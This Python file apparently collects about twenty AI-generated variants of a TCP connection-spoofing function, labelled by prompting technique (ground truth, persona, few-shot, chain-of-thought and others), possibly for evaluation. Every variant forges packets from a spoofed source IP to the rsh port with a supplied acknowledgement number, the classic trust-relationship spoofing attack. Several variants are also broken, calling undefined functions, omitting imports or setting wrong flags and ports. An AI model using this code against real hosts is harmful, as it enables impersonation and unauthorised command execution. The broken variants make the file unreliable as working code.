from scapy.all import *
import socket
import struct
import random

def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def ground_truth_code_spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)

def persona_spoofConn(src, tgt, ack):
    packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='SA', ack=ack)
    send(packet)


def template_spoofConn(src, tgt, ack):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton(src), socket.inet_aton(tgt))
        seq_num = random.randint(0, 4294967295)
        tcp_header = struct.pack('!HHLLBBHHH', 513, 514, seq_num, ack, 80, 2, 29200, 0, 0)
        pkt = ip_header + tcp_header
        s.sendto(pkt, (tgt, 0))
        s.close()
    except Exception as e:
        print(f"Error: {str(e)}")

def question_refinement_send_syn_ack_packet(src_ip, target_ip, src_port = 513, dst_port = 514):
    logging.basicConfig(level=logging.INFO)
    allowed_ips = {target_ip}
    if target_ip not in allowed_ips:
        logging.warning('Attempt to send packet to a non-whitelisted IP: %s', target_ip)
        raise ValueError("Non-whitelisted IP")
    if not (1 <= src_port <= 65535 and 1 <= dst_port <= 65535):
        raise ValueError("Ports must be in range 1-65535")
    packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=dst_port, flags='SA')
    logging.info('Sending SYN-ACK packet from %s:%s to %s:%s', src_ip, src_port, target_ip, dst_port)
    try:
        send(packet, verbose=0)
        print('Packet sent successfully')
    except Exception as e:
        print('Error sending packet: %s', e)

def alternative_approaches_spoofConn(src, tgt, ack):
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((src, 513))
        packet = create_packet(src, tgt, ack)
        sock.sendto(packet, (tgt, 514))
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        sock.close()

def context_manager_spoofConn(src, tgt, ack):
    def checksum(data):
        if len(data) % 2 == 1:
            data += b'\0'
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff
    def create_packet(src_ip, dst_ip, src_port, dst_port, seq, ack_seq):
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                69, 0, 0, socket.htons(40), random.randint(0, 65535),
                                64, socket.IPPROTO_TCP, 0, socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, seq, ack_seq, 80, 18, socket.htons(8192), 0, 0)
        pseudo_header = struct.pack('!4s4sBBH',
                                    socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header))
        checksum_value = checksum(pseudo_header + tcp_header)
        tcp_header = struct.pack('!HHLLBBH',
                                 src_port, dst_port, seq, ack_seq, 80, 18, socket.htons(8192)) + struct.pack('H', checksum_value) + struct.pack('!H', 0)
        return ip_header + tcp_header
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        seq_num = random.randint(0, 4294967295)
        packet = create_packet(src, tgt, 513, 514, seq_num, ack)
        try:
            s.sendto(packet, (tgt, 0))
        except Exception as e:
            print (e)

def flipped_interaction_3_spoofConn(src, tgt, ack):
    ip = IP(src=src, dst=tgt)
    SYN = TCP(sport=513, dport=514, flags='S', seq=ack)
    ACK = TCP(sport=513, dport=514, flags='A', seq=ack, ack=1)
    send(ip/SYN)
    send(ip/ACK)

def flipped_interaction_4_spoofConn(src, tgt, ack):
    ip_layer = IP(src=src, dst=tgt)
    tcp_syn = TCP(sport=513, dport=514, flags='S', seq=1000)
    tcp_ack = TCP(sport=513, dport=514, flags='A', seq=1001, ack=ack)
    send(ip_layer/tcp_syn)
    send(ip_layer/tcp_ack)

def flipped_interaction_5_spoofConn(src, tgt, ack):
    ip = IP(src=src, dst=tgt)
    syn_ack_packet = TCP(sport=513, dport=514, flags='SA', ack=ack)
    packet = ip/syn_ack_packet
    send(packet)

def iterative_prompting_3_spoof_conn(src, tgt, ack):
    
    if not is_valid_ip(src):
        raise ValueError(f"Invalid source IP address: {src}")
    if not is_valid_ip(tgt):
        raise ValueError(f"Invalid target IP address: {tgt}")
    if not isinstance(ack, int) or ack < 0:
        raise ValueError("ACK value must be a non-negative integer")
    src_port = 513
    dst_port = 514
    ip_packet = IP(src=src, dst=tgt)
    syn_packet = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
    try:
        send(ip_packet/syn_packet, verbose=False)
    except Exception as e:
        print(f"Failed to send SYN packet: {e}")
    ack_packet = TCP(sport=src_port, dport=dst_port, flags='A', seq=1001, ack=ack)
    try:
        send(ip_packet/ack_packet, verbose=False)
    except Exception as e:
        print(f"Failed to send ACK packet: {e}")

def iterative_prompting_4_spoof_conn(src, tgt, ack):
    import socket
    from struct import pack
    import ipaddress
    def is_valid_ipv4_address(address):
        try:
            ipaddress.IPv4Address(address)
            return True
        except ipaddress.AddressValueError:
            return False
    if not is_valid_ipv4_address(src) or not is_valid_ipv4_address(tgt):
        raise ValueError('Invalid IP address format for src or tgt')
    if not isinstance(ack, int) or ack < 0:
        raise ValueError('ACK must be a non-negative integer')
    def checksum(data):
        s = 0
        for i in range(0, len(data), 2):
            if i + 1 < len(data):
                a = data[i]
                b = data[i + 1]
                s = s + (a + (b << 8))
            elif i + 1 == len(data):
                s += data[i]
        s = s + (s >> 16)
        s = ~s & 0xFFFF
        return s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error as msg:
        print(f'Error during socket creation or option setting: {msg}')
        return
    try:
        ip_header = pack(
            '!BBHHHBBH4s4s',
            69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,
            socket.inet_aton(src), socket.inet_aton(tgt)
        )
        tcp_header = pack('!HHLLBBHHH', 513, 514, 0, ack, 80, 2, 5840, 0, 0)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = pack('!4s4sBBH', socket.inet_aton(src), socket.inet_aton(tgt), placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = pack('!HHLLBBH', 513, 514, 0, ack, 80, 2, 5840) + pack('H', tcp_checksum) + pack('!H', 0)
        packet = ip_header + tcp_header
        s.sendto(packet, (tgt, 0))
        print(f'SYN/ACK packet has been sent from {src} to {tgt}')
    except Exception as e:
        print(f'Error during packet creation or sending: {e}')
    finally:
        s.close()
    
        
def iterative_prompting_5_spoofConn(src, tgt, ack):
    if not (is_valid_ip(src) and is_valid_ip(tgt)):
        print("Invalid IP address provided.")
    if not isinstance(ack, int) or ack < 0:
        print("Invalid ACK number. Must be a non-negative integer.")
    conf.verb = 0
    try:
        syn_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S', seq=1000)
        send(syn_packet)
        ack_packet = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', seq=1001, ack=ack)
        send(ack_packet)
    except Exception as e:
        print(f"An error occurred while sending packets: {e}")

def few_shots_prompting_spoofConn(src, tgt, ack):
    syn_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    send(syn_pkt)
    ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', ack=ack)
    send(ack_pkt)

def cot_prompting_spoofConn(src, tgt, ack):
    syn_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A', ack=ack)
    send(syn_pkt)
    send(ack_pkt)


def fact_check_list_spoofConn(src, tgt, ack):
    ip_packet = IP(src=src, dst=tgt)
    syn_packet = TCP(sport=513, dport=514, flags='S', seq=ack)
    send(ip_packet/syn_packet)
    syn_ack_packet = TCP(sport=514, dport=513, flags='SA', seq=ack+1, ack=ack+1)
    send(ip_packet/syn_ack_packet)

def not_interactive_mix_spoofConn(src, tgt, ack):
    import scapy.all as scapy
    if not isinstance(src, str) or not isinstance(tgt, str) or not isinstance(ack, int):
        raise ValueError("Invalid input types. 'src' and 'tgt' should be strings (IP addresses) and 'ack' should be an integer.")
    try:
        syn_pkt = scapy.IP(src=src, dst=tgt) / scapy.TCP(sport=513, dport=514, flags='S', seq=1000)
        scapy.send(syn_pkt, verbose=False)
        ack_pkt = scapy.IP(src=src, dst=tgt) / scapy.TCP(sport=513, dport=514, flags='A', seq=1001, ack=ack)
        scapy.send(ack_pkt, verbose=False)
    except Exception as e:
        print(f'Error: {str(e)}')

def interactive_mix_send_syn_ack(src, tgt, ack):
    from scapy.all import IP, TCP, send
    if not isinstance(src, str) or not isinstance(tgt, str):
        raise ValueError('Source and Target IP addresses must be strings.')
    import socket
    try:
        socket.inet_aton(src)
        socket.inet_aton(tgt)
    except socket.error:
        raise ValueError('Invalid IP address format.')
    syn_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='S')
    send(syn_pkt, verbose=False)
    ack_pkt = IP(src=src, dst=tgt) / TCP(sport=513, dport=514, flags='A')
    send(ack_pkt, verbose=False)

def baseline_spoofConn(src, tgt, ack):
    ip = IP(src=src, dst=tgt)
    syn = TCP(sport=513, dport=514, flags='S', seq=100)
    synack = TCP(sport=514, dport=513, flags='SA', seq=100, ack=ack)
    send(ip/syn)
    send(ip/synack)

